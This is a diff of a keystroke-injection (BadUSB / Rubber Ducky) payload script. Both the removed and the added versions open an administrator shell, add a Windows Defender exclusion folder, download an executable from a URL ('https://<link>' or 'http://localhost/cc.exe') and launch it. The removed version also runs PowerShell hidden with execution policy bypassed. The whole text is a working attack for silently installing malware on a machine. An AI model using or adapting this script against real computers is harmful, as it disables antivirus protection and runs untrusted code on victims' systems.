@@ -1,16 +1,16 @@
-DELAY 700
-GUI r
-DELAY 500
-STRING powershell Start-Process cmd -VERB runAs
-ENTER
-DELAY 1000
+GUI x
+DELAY 100
+a
+DELAY 300
 ALT y
+DELAY 300 
+
+STRING mkdir "C:\xxx"
+ENTER
 DELAY 700
-STRING mkdir C:\tmp
+STRING Add-MpPreference -Force -ExclusionPath "C:\xxxx"; Invoke-WebRequest -Uri 'http://localhost/cc.exe' -Outfile 'C:\xxx\xxx.exe'; Start-Process -FilePath 'C:\xxx\xxx.exe'
 ENTER
-DELAY 200
-STRING powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command {Add-MpPreference -Force -ExclusionPath "C:\tmp"}; Invoke-WebRequest -Uri 'https://<link>' -Outfile 'C:\tmp\install.exe'; Add-MpPreference -ExclusionProcess -Force 'C:\tmp\install.exe'; Start-Process -FilePath 'C:\tmp\install.exe'
-ENTER
-DELAY 1000
+DELAY 1200
 STRING exit
 ENTER
+
